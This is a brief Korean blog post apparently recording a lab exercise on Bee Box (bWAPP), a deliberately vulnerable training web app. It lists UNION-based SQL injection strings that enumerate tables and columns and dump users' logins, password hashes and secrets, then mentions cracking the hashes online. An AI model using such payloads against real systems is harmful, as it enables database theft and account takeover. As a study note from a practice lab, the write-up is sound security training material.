---
title:  "Bee Box 실습"
excerpt: "Bee Box에서 SQL Injection 실습"

categories: web-security
tags:
  - [bee-box, sql-injection]

toc: true
toc_sticky: true
 
date: 2022-05-11-00:01
last_modified_at: 2022-05-11-00:02
---

#### Bee Box SQL Injection
* * *
- sql injection 탭에서 
- e' union select null,null,null,table_name,null,null,null from information_schema.tables where table_schema = 'bWAPP' #

![](../../assets/images/20220523-100826.png){: .center}

- e' union select null,null,null,column_name,null,null,null from information_schema.columns where table_name='users' and table_schema='bWAPP' #

![](../../assets/images/20220523-100846.png){: .center}

- e' union select id, login,password,email,secret,null,null from bWAPP.users #

![](../../assets/images/20220523-100901.png){: .center}

- crackstation 에서 해쉬 크랙

![](../../assets/images/20220523-100926.png){: .center}